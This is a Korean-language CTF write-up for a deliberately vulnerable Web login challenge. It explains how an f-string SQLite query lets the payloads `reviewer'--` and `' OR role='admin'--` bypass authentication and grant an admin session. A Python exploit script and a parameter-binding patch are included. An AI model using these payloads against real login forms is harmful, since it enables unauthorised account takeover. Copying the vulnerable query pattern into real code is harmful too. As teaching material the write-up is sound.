# easy-05 staff — 로그인 SQL 인젝션으로 관리자 권한 탈취

> 출제: 수하 · 분류: Web · 난이도: Easy

---

## 1. 문제 개요

| 항목 | 내용 |
|---|---|
| 분류 | Web |
| 난이도 | Easy |
| 접속 | `http://<출제조IP>:8007` |
| 인증 | 회원가입으로 신청자 계정을 만들 수 있으나, 공격 자체는 로그인만으로 성립 |
| 플래그 형식 | `GlassHouse{...}` |
| 최종 목표 | 운영진(admin) 비밀번호를 모르는 채로 운영진으로 로그인해, `/admin` 첫 화면의 "명단 열람 확인 코드"(플래그)를 읽어낸다 |

운영 사무국이 로그인 화면을 급히 새로 만들면서, 신청자와 운영진이 같은 화면에서 로그인하게 되었다. 운영진 포털 첫 화면에는 플래그가 걸려 있지만, 운영진 비밀번호는 사무국 밖으로 나간 적이 없다. 비밀번호 없이 운영진 화면에 들어가는 것이 과제다.

---

## 2. 취약점의 원인과 성립 조건

### 처음 보이는 동작

로그인 화면에 아이디·비밀번호를 넣어 제출하면 서버가 계정을 확인한다. 회원가입으로 신청자 계정도 만들 수 있다. 눈에 보이는 건 평범한 로그인 폼이지만, 서버가 그 입력을 어떻게 확인하는지가 문제다.

### 취약한 코드

인증의 핵심은 `db.py` 의 `login_information()` 한 곳이다.

```python
def login_information(username, password):
    conn = sqlite3.connect(":memory:")
    ...
    query = (
        "SELECT id, username, name, role FROM users "
        f"WHERE username = '{username}' AND password = '{password}'"   # ← 문제의 조립
    )
    row = conn.execute(query).fetchone()
    conn.close()
    return row
```

여기서 `username` 과 `password` 는 `routes/auth.py` 의 `login()` 이 폼에서 받은 값을 아무 검증 없이 그대로 넘긴 것이다. (회원가입 `signup()` 에는 `[A-Za-z0-9]{4,20}` 정규식 필터가 있지만, 로그인에는 그런 필터가 전혀 없다.)

### 왜 뚫리는가 — 원인

문제의 뿌리는 사용자 입력을 SQL 문자열에 그대로 이어 붙인 것이다. 입력값은 원래 "데이터" 여야 하는데, 이렇게 조립하면 입력이 쿼리의 "문법" 으로 끼어들 수 있다. 이것이 SQL 인젝션(SQL Injection) 이다.

쿼리에서 아이디는 작은따옴표로 감싸여 있다(`username = '...'`). 그러니 입력에 작은따옴표 `'` 를 하나 넣으면 문자열을 중간에 닫아버리고, 그 뒤부터는 내가 쓴 글자가 SQL 문법으로 해석된다. 여기에 SQLite 주석 기호 `--` 를 붙이면 그 뒤의 조건(비밀번호 검사)을 통째로 주석 처리해 없앨 수 있다.

예를 들어 아이디 칸에 `reviewer'--` 를 넣으면 쿼리는 이렇게 변한다.

```sql
SELECT id, username, name, role FROM users
WHERE username = 'reviewer'--' AND password = '...'
```

`'reviewer'` 에서 문자열이 닫히고, `--` 부터 줄 끝까지는 주석이라 사라진다. 남는 조건은 `WHERE username = 'reviewer'` 뿐 — 비밀번호를 확인하지 않고 운영진 행을 돌려준다.

### 인증 우회가 곧 권한 상승인 이유

`routes/auth.py` 의 로그인은 *"쿼리가 행을 하나라도 돌려주면 그 사람으로 로그인"* 하는 구조다.

```python
user = db.login_information(username, password)
if user is None:
    ... # 실패
session["user_id"] = user["id"]
session["role"] = user["role"]      # ← 돌려받은 행의 role 을 그대로 신뢰
```

세션의 권한(`role`)을 쿼리가 돌려준 행에서 그대로 가져온다. 그래서 쿼리가 운영진 행을 반환하도록 만드는 순간, 비밀번호를 몰라도 `role = admin` 세션이 발급된다. 즉 인증 우회가 그대로 관리자 권한 상승으로 이어진다. (운영진 비밀번호 자체를 훔칠 필요도 없다 — 로그인을 통과시키는 것만으로 충분하다.)

### 성립 조건 정리

- 사용자 입력(`username`·`password`)이 쿼리 문자열에 직접 삽입된다(f-string, 파라미터 바인딩 미사용).
- 로그인 입력에 검증·이스케이프가 전혀 없다.
- 로그인이 "행이 반환되면 그 행의 `role` 로 세션 부여" 구조라, 인증 우회 = 권한 상승이다.
- 운영진 아이디(`reviewer`)가 공개 소스(`data.py`)에 그대로 적혀 있어, 표적 행을 정확히 지목할 수 있다.

---

## 3. 풀이

### 단서에서 payload까지

1. 운영진 비밀번호는 공개된 적이 없으니 정공법으로는 못 들어간다. 하지만 로그인은 "쿼리가 운영진 행을 돌려주면" 통과되고, 운영진 아이디는 소스에 `reviewer` 로 나와 있다.
2. 아이디 칸에서 작은따옴표로 문자열을 닫고 `--` 로 비밀번호 조건을 주석 처리하면, `username = 'reviewer'` 조건만 남겨 운영진 행을 끌어올 수 있다.

### 공격 수행

로그인 폼에 다음을 입력하고 제출한다.

| 칸 | 값 |
|---|---|
| 아이디 | `reviewer'--` |
| 비밀번호 | 아무 값 (예: `x`) |

쿼리가 `WHERE username = 'reviewer'` 로 축약되어 운영진 행이 반환되고, 세션에 `role = admin` 이 박힌다. 이 상태로 `/admin` 에 접속하면 운영진 포털 첫 화면이 열린다.

> 변형 payload: 아이디에 `' OR role='admin'--` 를 넣어도 된다. `username = '' OR role='admin'` 이 되어 역시 운영진 행을 반환한다. 아이디를 몰라도 "역할이 admin인 행" 을 직접 노리는 방식이다.

### 성공 판별 기준

- 공격 전에는 `/admin` 접근이 로그인/403으로 막혀 있다가,
- 로그인 후 `/admin` 이 200으로 열리고, 화면 안내 박스에 다음이 보이면 성공이다.

```
운영진 전용 · 명단 열람 확인 코드 GlassHouse{[실제 플래그 값]}
```

(대괄호 안은 서버 실행 시 출력되는 실제 값 — 취약 버전에서 뽑아 채운다.)

---

## 4. 패치 방안과 검증

### 왜 기존 방식이 틀렸나

근본 원인은 값과 코드를 문자열로 이어 붙여 섞은 것이다. 입력에서 따옴표만 지우는 식의 임시방편은 또 다른 우회(인코딩, 다른 주석 기호 등)로 늘 뚫린다. 올바른 해법은 값을 문법에서 분리하는 것, 곧 파라미터 바인딩(prepared statement) 이다. 이렇게 하면 입력은 언제나 "데이터" 로만 취급되어 아무리 따옴표를 넣어도 쿼리 구조를 바꾸지 못한다.

### 권장 패치 — 파라미터 바인딩

```python
def login_information(username, password):
    conn = sqlite3.connect(":memory:")
    ...
    row = conn.execute(
        "SELECT id, username, name, role FROM users "
        "WHERE username = ? AND password = ?",
        (username, password),          # 값은 별도 인자로 — 쿼리 문자열에 끼워 넣지 않는다
    ).fetchone()
    conn.close()
    return row
```

### 검증

- 우회 차단 확인: 패치 후 아이디에 `reviewer'--` 를 넣어 로그인 시도 → 이제 `reviewer'--` 라는 아이디를 가진 사용자를 찾는 꼴이 되어 일치하는 행이 없어 로그인 실패한다. SQLi로 운영진이 될 수 없다.
- 정상 동작 확인: 회원가입으로 만든 신청자 계정(또는 올바른 운영진 비밀번호)으로 로그인 → 정상 로그인된다.

두 가지를 모두 만족해야 "막으면서 기능은 유지" 한 올바른 패치다.

---

## 5. 익스플로잇 코드

### 공격의 본체

로그인 화면에서 아이디 칸에 `reviewer'--`, 비밀번호에 아무 값을 넣어 로그인한다. 비밀번호 조건이 주석 처리되어 운영진으로 로그인되고, 그 상태로 `/admin` 에 들어가면 "명단 열람 확인 코드" 에 플래그가 보인다.

| 단계 | 요청 | 입력 / 확인 |
|---|---|---|
| 1 | `POST /login` | 아이디 `reviewer'--`, 비밀번호 아무거나 |
| 2 | `GET /admin` | 운영진 포털 첫 화면에서 플래그 확인 |

> 2단계인 이유: 이 문제는 "로그인 우회" 라서, 우회로 운영진 세션을 얻은 뒤 그 권한으로 플래그가 있는 다른 화면(`/admin`)에 들어가야 한다. 브라우저로 하면 세션(쿠키)이 자동으로 유지되므로 ①에서 로그인하고 ②로 이동만 하면 된다.

### 스크립트로 재현

브라우저 대신 스크립트로 할 때는 로그인한 세션을 그대로 이어서 `/admin` 에 들어간다.

```python
#!/usr/bin/env python3
# easy-05 (새 로그인 화면 / SQL Injection) - 아이디에 reviewer'-- 를 넣어 운영진으로 로그인
# 사용: python3 exploit.py http://<IP>:8007
import re
import sys
import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8007"
s = requests.Session()  # 세션 쿠키(gh_8007) 자동 관리

# 1) SQLi 로 운영진 로그인: 비밀번호 조건이 주석(--) 처리된다
r = s.post(f"{BASE}/login", data={"username": "reviewer'--", "password": "x"},
           allow_redirects=False)
print(f"[*] SQLi login (reviewer'--) -> {r.status_code}")

# 2) 그 세션으로 운영진 포털 접속 → 명단 열람 확인 코드
r = s.get(f"{BASE}/admin")
m = re.search(r"GlassHouse\{[^}]*\}", r.text)
print(f"[+] FLAG: {m.group(0)}" if m else "[-] 실패")
```

실행 예시

```bash
$ python3 exploit.py http://127.0.0.1:8007
[*] SQLi login (reviewer'--) -> 302
[+] FLAG: GlassHouse{...}
```
